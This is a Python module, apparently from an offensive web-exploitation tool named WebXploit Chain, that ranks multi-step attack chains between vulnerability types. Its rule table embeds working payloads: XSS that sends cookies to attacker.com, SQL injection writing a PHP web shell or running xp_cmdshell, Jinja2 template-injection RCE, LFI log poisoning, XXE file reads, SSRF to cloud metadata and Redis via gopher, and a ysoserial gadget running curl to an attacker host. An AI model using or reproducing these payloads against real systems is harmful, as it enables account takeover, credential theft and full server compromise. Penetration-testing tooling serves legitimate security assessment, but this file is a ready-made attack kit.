"""
Vuln Chaining Engine — the heart of WebXploit Chain.

Builds a directed dependency graph of discovered vulnerabilities and
automatically proposes multi-step attack chains (e.g. XSS → CSRF → RCE).

Architecture
------------
Each VulnType is a node in the graph.  Directed edges represent "if you have
vuln A confirmed, vuln B can be leveraged next".  Edge metadata carries:

  - prerequisites  : conditions that must hold (e.g. "same origin", "admin panel present")
  - chain_payload  : how to craft the combined exploit payload
  - impact_delta   : how much the severity increases when chained
  - description    : human-readable explanation of the step

The engine accepts a list of confirmed/suspected Finding objects, queries the
graph for reachable paths, and returns ranked VulnChain objects ready to be
added to the Engagement.
"""

from __future__ import annotations

import json
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

import yaml

from webxploit.core.models import (
    ChainLink,
    Finding,
    Severity,
    VulnChain,
    VulnType,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Edge metadata
# ---------------------------------------------------------------------------


@dataclass
class ChainEdge:
    """Metadata for a directed edge in the chain graph."""

    source: VulnType
    target: VulnType
    description: str
    prerequisites: list[str] = field(default_factory=list)
    chain_action: str = ""  # what the attacker does at this step
    payload_hint: str = ""  # template/hint for chained payload
    severity_bump: int = 0  # +N to base CVSS when chained
    confidence: float = 0.8  # 0-1: how reliable is this chain edge
    tags: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "from": self.source.value,
            "to": self.target.value,
            "description": self.description,
            "chain_action": self.chain_action,
            "confidence": self.confidence,
            "prerequisites": self.prerequisites,
        }


# ---------------------------------------------------------------------------
# Chain graph definition
# ---------------------------------------------------------------------------

#  Each tuple: (source, target, edge metadata dict)
#  This is the knowledge base of known exploitation chains.
#  Extend this list to teach the engine new attack paths.

_CHAIN_RULES: list[tuple[VulnType, VulnType, dict]] = [
    # XSS chains
    (
        VulnType.XSS,
        VulnType.CSRF,
        {
            "description": "Weaponise XSS to forge authenticated requests on behalf of the victim.",
            "chain_action": "Inject script that silently submits a state-changing form with victim's session.",
            "payload_hint": "<script>fetch('/admin/action',{method:'POST',credentials:'include',body:'...'})</script>",
            "prerequisites": ["state-changing endpoint exists", "SameSite cookie not Strict"],
            "severity_bump": 2,
            "confidence": 0.9,
            "tags": ["session-riding", "client-side"],
        },
    ),
    (
        VulnType.XSS,
        VulnType.AUTH_BYPASS,
        {
            "description": "Steal session tokens or credentials via XSS to bypass authentication.",
            "chain_action": "Exfiltrate document.cookie or localStorage tokens to attacker-controlled server.",
            "payload_hint": "<script>new Image().src='https://attacker.com/c?c='+btoa(document.cookie)</script>",
            "prerequisites": ["HttpOnly not set on session cookie"],
            "severity_bump": 3,
            "confidence": 0.85,
            "tags": ["credential-theft", "session-hijack"],
        },
    ),
    (
        VulnType.XSS,
        VulnType.RCE,
        {
            "description": "Chain XSS to achieve RCE via Electron/Node.js desktop apps or JS injection in SSR.",
            "chain_action": "Exploit nodeIntegration or SSR eval to execute OS commands.",
            "payload_hint": "require('child_process').exec('id', (e,o)=>fetch('//attacker/?r='+o))",
            "prerequisites": ["Electron app with nodeIntegration enabled OR SSR with eval()"],
            "severity_bump": 4,
            "confidence": 0.5,
            "tags": ["rce", "electron", "ssr"],
        },
    ),
    # SQLi chains
    (
        VulnType.SQLI,
        VulnType.AUTH_BYPASS,
        {
            "description": "Use SQL injection to bypass login authentication directly.",
            "chain_action": "Inject ' OR '1'='1 or UNION-based payload to skip password check.",
            "payload_hint": "' OR 1=1-- -",
            "prerequisites": ["login form with SQL backend"],
            "severity_bump": 3,
            "confidence": 0.95,
            "tags": ["auth-bypass", "login"],
        },
    ),
    (
        VulnType.SQLI,
        VulnType.RCE,
        {
            "description": "Escalate SQLi to OS command execution via INTO OUTFILE, xp_cmdshell, or UDF.",
            "chain_action": "Write web shell via SELECT ... INTO OUTFILE or enable xp_cmdshell on MSSQL.",
            "payload_hint": "'; EXEC xp_cmdshell('whoami');--  /  SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'",
            "prerequisites": [
                "FILE privilege (MySQL) OR sysadmin role (MSSQL)",
                "writable web root",
            ],
            "severity_bump": 4,
            "confidence": 0.7,
            "tags": ["rce", "file-write", "database"],
        },
    ),
    (
        VulnType.SQLI,
        VulnType.INFO_DISCLOSURE,
        {
            "description": "Dump sensitive data (credentials, PII, API keys) via SQL injection.",
            "chain_action": "UNION SELECT username, password_hash FROM users--",
            "payload_hint": "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
            "prerequisites": [],
            "severity_bump": 2,
            "confidence": 0.95,
            "tags": ["data-exfil", "credential-dump"],
        },
    ),
    # SSRF chains
    (
        VulnType.SSRF,
        VulnType.IDOR,
        {
            "description": "Use SSRF to reach internal APIs not exposed externally, bypassing access controls.",
            "chain_action": "Pivot SSRF to internal metadata API or admin endpoint at 169.254.169.254 or 127.0.0.1.",
            "payload_hint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "prerequisites": ["internal services present", "SSRF not limited to allowlist"],
            "severity_bump": 2,
            "confidence": 0.8,
            "tags": ["cloud-metadata", "internal-pivot"],
        },
    ),
    (
        VulnType.SSRF,
        VulnType.RCE,
        {
            "description": "Chain SSRF to RCE via internal services (Redis, Memcached, Gopher protocol).",
            "chain_action": "Use Gopher:// SSRF to interact with Redis and write cron job or SSH key.",
            "payload_hint": "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...",
            "prerequisites": [
                "Redis/Memcached without auth on internal network",
                "Gopher protocol enabled",
            ],
            "severity_bump": 4,
            "confidence": 0.65,
            "tags": ["gopher", "redis", "rce"],
        },
    ),
    (
        VulnType.SSRF,
        VulnType.INFO_DISCLOSURE,
        {
            "description": "Read cloud instance metadata, internal config files, or secrets via SSRF.",
            "chain_action": "Fetch AWS/GCP/Azure metadata endpoint to obtain IAM credentials.",
            "payload_hint": "http://169.254.169.254/latest/meta-data/",
            "prerequisites": ["cloud environment"],
            "severity_bump": 2,
            "confidence": 0.9,
            "tags": ["cloud", "metadata", "aws", "gcp"],
        },
    ),
    # IDOR chains
    (
        VulnType.IDOR,
        VulnType.INFO_DISCLOSURE,
        {
            "description": "Access other users' data via IDOR to exfiltrate PII or sensitive records.",
            "chain_action": "Enumerate object IDs to access unauthorised user data.",
            "payload_hint": "GET /api/users/{id}/profile - try sequential or UUID enumeration",
            "prerequisites": [],
            "severity_bump": 1,
            "confidence": 0.95,
            "tags": ["enumeration", "pii"],
        },
    ),
    (
        VulnType.IDOR,
        VulnType.AUTH_BYPASS,
        {
            "description": "Use IDOR on password-reset or admin endpoints to take over accounts.",
            "chain_action": "IDOR on /api/users/{id}/reset-password to reset admin account.",
            "payload_hint": 'PATCH /api/users/1/reset-password {"new_password":"attacker"}',
            "prerequisites": ["account management endpoints", "predictable user IDs"],
            "severity_bump": 3,
            "confidence": 0.75,
            "tags": ["account-takeover"],
        },
    ),
    # LFI chains
    (
        VulnType.LFI,
        VulnType.RCE,
        {
            "description": "Escalate LFI to RCE via log poisoning, /proc/self/fd, or PHP session files.",
            "chain_action": "Inject PHP payload into user-controlled log (User-Agent) then include it.",
            "payload_hint": "User-Agent: <?php system($_GET['c']); ?>  then  ?file=../../../../var/log/apache2/access.log",
            "prerequisites": ["PHP application", "readable log files or session storage"],
            "severity_bump": 4,
            "confidence": 0.7,
            "tags": ["log-poisoning", "php", "rce"],
        },
    ),
    (
        VulnType.LFI,
        VulnType.INFO_DISCLOSURE,
        {
            "description": "Read sensitive files: /etc/passwd, .env, config files, SSH keys.",
            "chain_action": "Use LFI to read /etc/passwd, ../../.env, ../../config/database.yml.",
            "payload_hint": "?file=../../../../etc/passwd  or  ?file=../../../../.env",
            "prerequisites": [],
            "severity_bump": 2,
            "confidence": 0.9,
            "tags": ["file-read", "secrets"],
        },
    ),
    # SSTI chains
    (
        VulnType.SSTI,
        VulnType.RCE,
        {
            "description": "Escalate SSTI to full RCE via template engine's object traversal.",
            "chain_action": "Use Jinja2/Twig/Freemarker payload to call OS subprocess.",
            "payload_hint": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "prerequisites": ["server-side template engine (Jinja2, Twig, Freemarker, etc.)"],
            "severity_bump": 4,
            "confidence": 0.85,
            "tags": ["template-injection", "jinja2", "rce"],
        },
    ),
    # Auth bypass chains
    (
        VulnType.AUTH_BYPASS,
        VulnType.PRIV_ESC,
        {
            "description": "After authentication bypass, escalate to higher privilege roles.",
            "chain_action": "Access admin panel or modify role parameter to escalate privileges.",
            "payload_hint": "Modify JWT role claim, or access /admin/* after auth bypass.",
            "prerequisites": ["role-based access control present"],
            "severity_bump": 2,
            "confidence": 0.8,
            "tags": ["privilege-escalation", "horizontal-to-vertical"],
        },
    ),
    (
        VulnType.AUTH_BYPASS,
        VulnType.RCE,
        {
            "description": "Use admin access gained via auth bypass to deploy a webshell or RCE vector.",
            "chain_action": "Upload webshell via admin file manager, or execute OS commands via admin panel.",
            "payload_hint": "POST /admin/upload - multipart/form-data with shell.php",
            "prerequisites": ["admin functionality with file upload or command execution"],
            "severity_bump": 3,
            "confidence": 0.7,
            "tags": ["webshell", "admin-rce"],
        },
    ),
    # Open redirect chains
    (
        VulnType.OPEN_REDIRECT,
        VulnType.AUTH_BYPASS,
        {
            "description": "Chain open redirect with OAuth/SAML flow to steal authorisation codes.",
            "chain_action": "Set redirect_uri to open-redirect endpoint that forwards token to attacker.",
            "payload_hint": "/oauth/authorize?response_type=code&redirect_uri=https://victim.com/redirect?url=https://attacker.com",
            "prerequisites": ["OAuth or SSO flow with lax redirect_uri validation"],
            "severity_bump": 3,
            "confidence": 0.75,
            "tags": ["oauth", "token-theft", "redirect"],
        },
    ),
    # XXE chains
    (
        VulnType.XXE,
        VulnType.SSRF,
        {
            "description": "Use XXE external entity to reach internal services (OOB-XXE to SSRF).",
            "chain_action": "Define external entity pointing to internal IP or metadata endpoint.",
            "payload_hint": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
            "prerequisites": ["XML parser with external entity processing enabled"],
            "severity_bump": 2,
            "confidence": 0.85,
            "tags": ["oob-xxe", "internal-pivot"],
        },
    ),
    (
        VulnType.XXE,
        VulnType.INFO_DISCLOSURE,
        {
            "description": "Read local files via XXE file:// entity.",
            "chain_action": "Use file:/// entity to read /etc/passwd, keys, or config files.",
            "payload_hint": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "prerequisites": [],
            "severity_bump": 2,
            "confidence": 0.9,
            "tags": ["file-read"],
        },
    ),
    # Deserialisation
    (
        VulnType.DESERIALISATION,
        VulnType.RCE,
        {
            "description": "Unsafe deserialisation leads directly to arbitrary code execution.",
            "chain_action": "Submit crafted serialised object (ysoserial gadget chain) to trigger RCE.",
            "payload_hint": "java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/rce' | base64",
            "prerequisites": ["Java/PHP/.NET application with deserialisation of user input"],
            "severity_bump": 4,
            "confidence": 0.8,
            "tags": ["java", "php", "dotnet", "ysoserial"],
        },
    ),
    # Info Disclosure chains
    (
        VulnType.INFO_DISCLOSURE,
        VulnType.AUTH_BYPASS,
        {
            "description": "Leaked credentials or API keys enable direct authentication bypass.",
            "chain_action": "Use exposed credentials from /debug, .env, or error pages to login.",
            "payload_hint": "Check source comments, /debug endpoint, git history, .env file.",
            "prerequisites": ["credentials or tokens present in disclosed data"],
            "severity_bump": 2,
            "confidence": 0.85,
            "tags": ["credential-leak", "env-file"],
        },
    ),
]


# ---------------------------------------------------------------------------
# Severity ordering helper
# ---------------------------------------------------------------------------

_SEV_ORDER = {
    Severity.CRITICAL: 5,
    Severity.HIGH: 4,
    Severity.MEDIUM: 3,
    Severity.LOW: 2,
    Severity.INFO: 1,
}


def _max_severity(findings: list[Finding]) -> Severity:
    return max(findings, key=lambda f: _SEV_ORDER[f.severity]).severity


def _bump_severity(base: Severity, bump: int) -> Severity:
    levels = [Severity.INFO, Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL]
    idx = levels.index(base)
    return levels[min(idx + bump, len(levels) - 1)]


def _parse_vuln_type(value: object) -> VulnType:
    try:
        return VulnType(str(value).lower())
    except ValueError as exc:
        valid = ", ".join(v.value for v in VulnType)
        raise ValueError(f"Invalid vuln type {value!r}. Valid values: {valid}") from exc


# ---------------------------------------------------------------------------
# Chain graph
# ---------------------------------------------------------------------------


class ChainGraph:
    """
    Directed graph of VulnType → VulnType edges representing known chain paths.
    Implemented without networkx to keep dependencies minimal.
    Falls back to networkx for path enumeration if available.
    """

    def __init__(self, custom_rules_path: Optional[str] = None) -> None:
        # adjacency: source → list[ChainEdge]
        self._adj: dict[VulnType, list[ChainEdge]] = {}
        self._build_from_rules()
        if custom_rules_path:
            self.load_custom_rules(custom_rules_path)

    def _build_from_rules(self) -> None:
        for src, tgt, meta in _CHAIN_RULES:
            edge = ChainEdge(source=src, target=tgt, **meta)
            self._adj.setdefault(src, []).append(edge)

    def edges_from(self, vuln_type: VulnType) -> list[ChainEdge]:
        return self._adj.get(vuln_type, [])

    def all_paths(
        self,
        start: VulnType,
        available: set[VulnType],
        max_depth: int = 4,
    ) -> list[list[ChainEdge]]:
        """
        DFS over the graph, staying within the set of available vuln types.
        Returns all paths (as lists of ChainEdge) up to max_depth hops.
        """
        paths: list[list[ChainEdge]] = []

        def dfs(current: VulnType, path: list[ChainEdge], visited: set[VulnType]) -> None:
            for edge in self.edges_from(current):
                if edge.target in visited:
                    continue
                new_path = path + [edge]
                paths.append(new_path)
                if len(new_path) < max_depth and edge.target in available:
                    dfs(edge.target, new_path, visited | {edge.target})

        dfs(start, [], {start})
        return paths

    def add_custom_edge(self, edge: ChainEdge) -> None:
        """Register a user-defined chain edge at runtime."""
        self._adj.setdefault(edge.source, []).append(edge)
        logger.info("Custom chain edge added: %s → %s", edge.source.value, edge.target.value)

    def load_custom_rules(self, path: str | Path) -> None:
        """Load user-defined chain rules from a YAML or JSON file."""
        rules_path = Path(path)
        if not rules_path.exists():
            raise FileNotFoundError(f"Custom rules file not found: {rules_path}")

        raw_text = rules_path.read_text(encoding="utf-8")
        raw = (
            json.loads(raw_text)
            if rules_path.suffix.lower() == ".json"
            else yaml.safe_load(raw_text)
        )
        entries = raw.get("rules", raw) if isinstance(raw, dict) else raw
        if not isinstance(entries, list):
            raise ValueError("Custom chain rules must be a list or a mapping with a 'rules' list")

        for item in entries:
            if not isinstance(item, dict):
                raise ValueError("Each custom chain rule must be an object")
            edge = ChainEdge(
                source=_parse_vuln_type(item["from"]),
                target=_parse_vuln_type(item["to"]),
                description=str(item.get("description", "")),
                prerequisites=list(item.get("prerequisites", [])),
                chain_action=str(item.get("chain_action", "")),
                payload_hint=str(item.get("payload_hint", "")),
                severity_bump=int(item.get("severity_bump", 0)),
                confidence=float(item.get("confidence", 0.8)),
                tags=list(item.get("tags", [])),
            )
            self.add_custom_edge(edge)


# ---------------------------------------------------------------------------
# Chaining engine
# ---------------------------------------------------------------------------


@dataclass
class ChainResult:
    """Result returned by the chaining engine for a single proposed chain."""

    chain: VulnChain
    score: float  # 0-1 overall chain score
    confidence: float  # mean edge confidence across the chain
    reasoning: str


class ChainEngine:
    """
    Main entry point for the vulnerability chaining engine.

    Usage
    -----
    ::

        engine = ChainEngine()
        results = engine.analyse(findings)
        for result in results:
            print(result.chain.chain_label, result.score)
            engagement.add_chain(result.chain)
    """

    def __init__(self, graph: Optional[ChainGraph] = None, max_depth: int = 4) -> None:
        self.graph = graph or ChainGraph()
        self.max_depth = max_depth

    # ------------------------------------------------------------------ #
    # Public API
    # ------------------------------------------------------------------ #

    def analyse(
        self,
        findings: list[Finding],
        min_confidence: float = 0.5,
        min_chain_length: int = 2,
    ) -> list[ChainResult]:
        """
        Analyse a list of findings and return ranked ChainResult objects.

        Parameters
        ----------
        findings:
            All findings for the engagement (confirmed + suspected).
        min_confidence:
            Discard chains whose mean edge confidence is below this threshold.
        min_chain_length:
            Only return chains with this many or more steps.
        """
        if not findings:
            return []

        # Index findings by vuln type for fast lookup
        by_type: dict[VulnType, list[Finding]] = {}
        for f in findings:
            by_type.setdefault(f.vuln_type, []).append(f)

        available_types = set(by_type.keys())
        results: list[ChainResult] = []

        for start_type in available_types:
            paths = self.graph.all_paths(start_type, available_types, self.max_depth)
            for edge_path in paths:
                if len(edge_path) < min_chain_length - 1:
                    continue

                result = self._build_chain_result(edge_path, by_type, start_type)
                if result is None:
                    continue
                if result.confidence < min_confidence:
                    continue
                results.append(result)

        # Deduplicate identical chain labels, keeping highest score
        seen: dict[str, ChainResult] = {}
        for r in results:
            label = r.chain.chain_label
            if label not in seen or r.score > seen[label].score:
                seen[label] = r

        # Sort by score descending
        ranked = sorted(seen.values(), key=lambda r: r.score, reverse=True)
        logger.info(
            "Chain engine found %d unique chains from %d findings.", len(ranked), len(findings)
        )
        return ranked

    def suggest_next(self, confirmed_types: list[VulnType]) -> list[ChainEdge]:
        """
        Given already-confirmed vuln types, suggest the next exploitation steps.
        Useful for interactive mode during an engagement.
        """
        suggestions: list[ChainEdge] = []
        for vtype in confirmed_types:
            suggestions.extend(self.graph.edges_from(vtype))
        # Deduplicate by target
        seen_targets: set[VulnType] = set()
        unique: list[ChainEdge] = []
        for edge in sorted(suggestions, key=lambda e: e.confidence, reverse=True):
            if edge.target not in seen_targets:
                seen_targets.add(edge.target)
                unique.append(edge)
        return unique

    # ------------------------------------------------------------------ #
    # Internal chain building
    # ------------------------------------------------------------------ #

    def _build_chain_result(
        self,
        edge_path: list[ChainEdge],
        by_type: dict[VulnType, list[Finding]],
        start_type: VulnType,
    ) -> Optional[ChainResult]:
        """
        Turn a list of ChainEdges into a VulnChain with scored ChainLinks.
        """
        links: list[ChainLink] = []
        all_types = [start_type] + [e.target for e in edge_path]
        mean_confidence = sum(e.confidence for e in edge_path) / len(edge_path)
        total_bump = sum(e.severity_bump for e in edge_path)

        # Build ChainLink for the starting finding
        start_findings = by_type.get(start_type, [])
        if not start_findings:
            return None

        start_finding = start_findings[0]
        links.append(
            ChainLink(
                finding=start_finding,
                step_number=1,
                action=f"Initial foothold via {start_type.value.upper()}",
                payload=start_finding.payload,
            )
        )

        # Build ChainLink for each subsequent edge
        for i, edge in enumerate(edge_path, start=2):
            target_findings = by_type.get(edge.target, [])
            if target_findings:
                target_finding = target_findings[0]
            else:
                # Create a synthetic finding representing the chained target
                target_finding = Finding(
                    vuln_type=edge.target,
                    url=start_finding.url,
                    parameter=None,
                    severity=_bump_severity(start_finding.severity, edge.severity_bump),
                    evidence=f"Chained from {edge.source.value} - not yet confirmed",
                    payload=edge.payload_hint,
                )

            links.append(
                ChainLink(
                    finding=target_finding,
                    step_number=i,
                    action=edge.chain_action,
                    payload=edge.payload_hint,
                    depends_on=[links[-1].finding.id],
                )
            )

        # Compute overall chain severity
        base_severity = _max_severity([link.finding for link in links])
        chain_severity = _bump_severity(base_severity, min(total_bump, 4))

        # Compose chain name
        chain_label = " -> ".join(t.value.upper() for t in all_types)
        chain_name = f"{chain_label} chain"

        # Human-readable reasoning
        reasoning = self._build_reasoning(edge_path, start_type)

        chain = VulnChain(
            name=chain_name,
            description=reasoning,
            links=links,
            severity=chain_severity,
            impact=self._impact_statement(edge_path, chain_severity),
        )

        # Score: weighted by confidence × severity × chain length
        sev_weight = _SEV_ORDER[chain_severity] / 5.0
        len_weight = min(len(links) / 4.0, 1.0)
        score = (mean_confidence * 0.5) + (sev_weight * 0.35) + (len_weight * 0.15)

        return ChainResult(
            chain=chain,
            score=round(score, 3),
            confidence=round(mean_confidence, 3),
            reasoning=reasoning,
        )

    def _build_reasoning(self, edge_path: list[ChainEdge], start: VulnType) -> str:
        parts = [f"Starting with {start.value.upper()} as initial access."]
        for edge in edge_path:
            parts.append(f"-> {edge.description}")
        return " ".join(parts)

    def _impact_statement(self, edge_path: list[ChainEdge], severity: Severity) -> str:
        terminal = edge_path[-1].target if edge_path else None
        impact_map = {
            VulnType.RCE: "Full server compromise - arbitrary OS command execution.",
            VulnType.AUTH_BYPASS: "Unauthorised access to protected functionality or accounts.",
            VulnType.PRIV_ESC: "Elevation to administrative/root privileges.",
            VulnType.INFO_DISCLOSURE: "Exposure of sensitive data (credentials, PII, configuration).",
            VulnType.IDOR: "Access to other users' data without authorisation.",
        }
        default = f"Chained exploitation reaching {severity.value} severity impact."
        return impact_map.get(terminal, default) if terminal else default


# ---------------------------------------------------------------------------
# Convenience function
# ---------------------------------------------------------------------------


def analyse_findings(
    findings: list[Finding],
    min_confidence: float = 0.5,
) -> list[ChainResult]:
    """
    Module-level convenience wrapper around ChainEngine.analyse().

    Example
    -------
    ::

        from webxploit.core.chain_engine import analyse_findings
        chains = analyse_findings(engagement.findings)
    """
    return ChainEngine().analyse(findings, min_confidence=min_confidence)
